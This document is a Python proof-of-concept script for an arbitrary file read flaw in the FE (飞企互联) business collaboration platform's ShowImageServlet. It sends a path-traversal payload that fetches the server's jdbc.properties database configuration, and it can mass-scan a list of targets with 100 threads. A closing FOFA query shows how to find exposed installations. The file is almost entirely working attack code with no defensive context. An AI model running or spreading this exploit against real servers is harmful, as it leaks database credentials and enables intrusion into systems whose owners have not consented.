import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """飞企互联FE业务协作平台ShowImageServlet任意文件读取"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='飞企互联FE业务协作平台ShowImageServlet任意文件读取')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15",
        "Accept-Encoding": "gzip",
    }
    try:
        response = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if response.status_code == 200 and 'mssql' in response.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('飞企互联_result.txt','a') as f:
                f.write(f"{target}存在任意文件读取漏洞\n")
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"{target} 该站点可能存在任意文件读取漏洞请手工测试")
if __name__ == '__main__':
    main()



# fofa: app="飞企互联-FE企业运营管理平台"